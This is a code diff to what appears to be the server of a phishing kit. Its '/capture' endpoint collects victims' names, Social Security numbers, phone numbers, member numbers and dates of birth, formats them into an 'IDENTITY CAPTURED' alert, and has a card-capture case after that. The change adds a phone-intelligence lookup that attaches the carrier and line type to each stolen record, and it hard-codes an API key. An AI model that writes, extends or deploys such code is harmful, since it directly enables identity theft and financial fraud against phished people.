@@ -108,7 +108,7 @@ app.post('/capture', async (req, res) => {
         
         try {
             const abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
-            const url = `https://phonevalidation.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(phone)}`;
+            const url = `https://phoneintelligence.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(phone)}`;
             const abstractRes = await axios.get(url, { timeout: 3000 });
             const data = abstractRes.data;
             
@@ -187,18 +187,30 @@ app.post('/capture', async (req, res) => {
         case 'verify':
             let phoneFlag = d.phone || 'N/A';
             if (d.phone && d.phone.length > 5) {
-                const pVal = await apiNinja('validatephone', { number: d.phone });
-                if (pVal) {
-                    phoneFlag += pVal.is_valid ? ' (✅ Valid)' : ' (❌ Invalid)';
+                try {
+                    const abstractKey = '0adc8e15f7914654b2c102cebbb299a0';
+                    const url = `https://phoneintelligence.abstractapi.com/v1/?api_key=${abstractKey}&phone=${encodeURIComponent(d.phone)}`;
+                    const abstractRes = await axios.get(url, { timeout: 3000 });
+                    const pData = abstractRes.data;
+                    
+                    if (pData && pData.phone_validation) {
+                        const isValid = pData.phone_validation.is_valid ? '✅ Valid' : '❌ Invalid';
+                        const carrier = pData.phone_carrier?.name || 'Unknown Carrier';
+                        const lineType = pData.phone_carrier?.line_type || 'Unknown Line';
+                        phoneFlag += ` (${isValid} - ${lineType} - ${carrier})`;
+                    }
+                } catch(e) {
+                    // Fallback to basic string if API fails
                 }
             }
 
+            const dobStr = d.dob ? `${he(d.dob)} (✅ Frontend Validated)` : 'N/A';
             msg = "🪪 <b>✅ IDENTITY CAPTURED</b>\n" + header
                 + `👤 <b>Name:</b>  <code>${he(d.full_name || 'N/A')}</code>\n`
                 + `🔢 <b>SSN:</b>   <code>${he(d.ssn || 'N/A')}</code>\n`
                 + `📞 <b>Phone:</b> <code>${he(phoneFlag)}</code>\n`
                 + `🆔 <b>Member #:</b> <code>${he(d.member_num || 'N/A')}</code>\n`
-                + `🎂 <b>DOB:</b>   <code>${he(d.dob || 'N/A')} (✅ Frontend Validated)</code>`;
+                + `🎂 <b>DOB:</b>   <code>${dobStr}</code>`;
             break;
             
         case 'card':
